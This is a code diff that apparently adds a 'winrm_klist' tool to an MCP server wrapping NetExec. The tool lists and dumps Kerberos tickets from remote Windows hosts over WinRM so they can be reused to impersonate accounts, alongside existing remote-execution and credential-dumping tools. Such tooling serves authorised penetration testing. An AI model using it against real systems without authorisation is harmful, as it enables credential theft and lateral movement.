@@ -7,7 +7,7 @@ ports 5985/5986) is the post-credential exec/pivot surface. The tools span:
   * **Read-only** (``offensive=False``) -- auth check / fingerprint and remote
     directory listing.
   * **Offensive** (``offensive=True``, only under ``NXC_MODE=full``) -- remote
-    command execution (cmd / PowerShell), credential dumping (sam/lsa/dpapi), and
+    command execution (cmd / PowerShell), credential dumping (sam/lsa/dpapi/klist), and
     file get/put.
 
 **Auth model -- NTLM only.** Unlike SMB/LDAP, nxc's WinRM connection implements
@@ -24,9 +24,12 @@ deployments.
 
 from __future__ import annotations
 
+import time
+
 from ..auth import build_auth_flags
+from ..config import klist_ccaches
 from ..executor import execute
-from ..results import parse_lsa_secrets, parse_secretsdump
+from ..results import parse_klist_dumps, parse_klist_sessions, parse_lsa_secrets, parse_secretsdump
 
 
 async def _winrm_run(
@@ -284,6 +287,51 @@ def register(mcp, get_config) -> None:
             password=password, ntlm_hash=ntlm_hash, domain=domain, local_auth=local_auth,
             cred_id=cred_id, laps=laps,
         )
+
+    @mcp.tool()
+    async def winrm_klist(
+        targets: list[str],
+        dump: bool = False,
+        sessions: list[int] | None = None,
+        port: int | None = None,
+        check_proto: str | None = None,
+        http_timeout: int | None = None,
+        username: str | None = None,
+        password: str | None = None,
+        ntlm_hash: str | None = None,
+        domain: str | None = None,
+        local_auth: bool = False,
+        cred_id: int | None = None,
+        laps: str | None = None,
+    ) -> dict:
+        """List the Kerberos tickets (TGTs) cached on the target over WinRM (`--klist`), or dump them as ccache files (`--klist-dump`).
+
+        Without `dump`, returns `sessions` (`{host, index, account, logon_id, expires}`).
+        `dump=true` saves each TGT as a ccache file on the nxc host and returns `tickets`
+        (`{host, principal, logon_id, ccache}`): pass a `ccache` path as the `ccache`
+        parameter of an SMB or LDAP tool to act as that account (WinRM logins here are
+        NTLM-only). `sessions` takes `index` numbers from a listing to dump only those, and
+        implies `dump`.
+
+        Runs `klist` in a remote shell, so it needs an account that can open one.
+        CREDENTIAL-DUMPING (NXC_MODE=loot or full): read-only, but harvests credential material.
+        """
+        if sessions and any(n < 1 for n in sessions):
+            raise ValueError("sessions are the 1-based index numbers of a klist listing")
+        dump = dump or bool(sessions)
+        flags = ["--klist-dump", *map(str, sessions or [])] if dump else ["--klist"]
+        since = time.time()
+        result = await _winrm_run(
+            get_config, flags, targets, offensive=True, dump=True, port=port,
+            check_proto=check_proto, http_timeout=http_timeout, username=username,
+            password=password, ntlm_hash=ntlm_hash, domain=domain, local_auth=local_auth,
+            cred_id=cred_id, laps=laps,
+        )
+        if dump:
+            result["tickets"] = klist_ccaches(parse_klist_dumps(result["stdout"]), since)
+        else:
+            result["sessions"] = parse_klist_sessions(result["stdout"])
+        return result
 
     @mcp.tool()
     async def winrm_get_file(
